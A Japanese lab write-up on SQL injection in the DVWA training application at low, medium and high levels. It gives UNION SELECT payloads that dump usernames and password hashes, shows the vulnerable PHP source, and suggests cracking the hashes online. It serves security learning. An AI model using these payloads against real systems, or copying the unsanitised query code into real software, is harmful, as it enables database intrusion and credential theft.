# SQL Injection

<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
<details>
<summary>Table of Contents</summary>

- [SQL Injection](#sql-injection)
  - [Low Level](#low-level)
    - [実験結果](#実験結果)
    - [原因](#原因)
  - [Medium Level](#medium-level)
    - [実験結果](#実験結果-1)
    - [原因](#原因-1)
  - [High Level](#high-level)
    - [実験結果](#実験結果-2)
    - [原因](#原因-2)

</details>
<!-- END doctoc generated TOC please keep comment here to allow auto update -->

## Low Level

### 実験結果

以下を UserID に入力する。

```sql
' UNION SELECT user, password from users where '1' = '1
```

### 原因

該当するソースコードは以下になる。

```php
// /var/www/html/vulnerabilities/sqli/source/low.php

<?php

if( isset( $_REQUEST[ 'Submit' ] ) ) {
    // Get input
    $id = $_REQUEST[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    mysqli_close($GLOBALS["___mysqli_ston"]);
}

?>
```

これは `$id = $_REQUEST[ 'id' ];` で取得したユーザの入力値をそのままSQLクエリのシングルクォーテーション（`'`）で囲まれた領域に挿入していることが原因である。

つまり `' UNION SELECT user, password from users where '1' = '1` と挿入してしまうと、以下のSQLクエリが構築されてしまい、条件が必ず `TRUE` になってしまうことが原因である。

```sql
SELECT first_name, last_name FROM users WHERE user_id = '' UNION SELECT user, password from users where '1' = '1';
```

これで画面に表示されているハッシュ値を、[Hash Toolkit](https://hashtoolkit.com/decrypt-hash/?hash=5f4dcc3b5aa765d61d8327deb882cf99) などを使用して解読すればパスワードを盗み出すことが可能となる。

## Medium Level

### 実験結果

画面上の UserID に `1` を選択した状態にする。

そのうえでページの検証からソースコードを開き、以下のように改変する。

```html
<select>
  <option value="1 UNION SELECT user, password FROM users WHERE 1=1">
  <!-- other options ... -->
</select>
```

これで `Submit` ボタンを押してリクエストを送信すれば、USERに関する情報が全て取得できる。

### 原因

該当するソースコードは以下になる。

```php
// /var/www/html/vulnerabilities/sqli/source/medium.php
<?php

if( isset( $_POST[ 'Submit' ] ) ) {
    // Get input
    $id = $_POST[ 'id' ];

    $id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);

    $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query) or die( '<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Display values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

}

// This is used later on in the index.php page
// Setting it here so we can close the database connection in here like in the rest of the source scripts
$query  = "SELECT COUNT(*) FROM users;";
$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
$number_of_rows = mysqli_fetch_row( $result )[0];

mysqli_close($GLOBALS["___mysqli_ston"]);
?>
```

これはHTML上で `<select>` を使用してドロップボックス形式に入力を宣言したうえで、入力された値をエスケープ処理した後で、SQLクエリにそのまま挿入している。

つまりHTTPリクエストを送信する際のリクエストヘッダの内容を書き換えることができれば、SQLインジェクションを実行することができてしまう。

あとは Low レベルで行った手順を続けていけばいい。

## High Level

### 実験結果

入力欄に以下のSQLクエリを入力して送信すれば、

```sql
1' UNION SELECT user, password FROM users WHERE '1'='1'#
```

### 原因

該当するソースコードは以下になる。

```php
// /var/www/html/vulnerabilities/sqli/source/high.php
<?php

if( isset( $_SESSION [ 'id' ] ) ) {
    // Get input
    $id = $_SESSION[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '<pre>Something went wrong.</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);        
}

?>
```

先ほどと異なる点は、SQLクエリを送信するためにポップアップウィンドウを使用している点と、表示するレコードの数が `LIMIT 1` で1つだけに制限されている点である。

挿入されるSQLクエリの後ろにあるSQLは、コメントアウトすればいいだけである。
